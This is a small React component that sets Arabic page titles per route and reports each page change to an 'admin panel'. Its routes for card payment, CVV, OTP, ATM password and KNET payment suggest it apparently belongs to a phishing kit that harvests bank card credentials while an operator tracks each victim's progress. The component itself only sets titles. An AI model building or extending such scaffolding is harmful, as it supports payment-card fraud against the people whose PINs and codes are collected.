import { useEffect } from "react";
import { useLocation } from "wouter";
import { updatePage } from "@/lib/store";

export default function PageTitleUpdater() {
  const [location] = useLocation();

  useEffect(() => {
    let title = "بيمة"; // Default title

    // Map all routes to proper page names
    const routeToTitle: Record<string, string> = {
      "/": "بيمة",
      "/summary-payment": "ملخص الدفع",
      "/credit-card-payment": "الدفع بالبطاقة",
      "/otp-verification": "التحقق",
      "/atm-password": "التحقق",
      "/knet-payment": "الدفع",
      "/cvv": "التحقق",
      "/final-page": "تم التأكيد",
      "/404": "الصفحة غير موجودة",
    };

    // Get title from map or use default
    title = routeToTitle[location] || "بيمة";

    // Update browser title
    document.title = title;
    
    // Update page name in admin panel
    updatePage(title);
  }, [location]);

  return null;
}
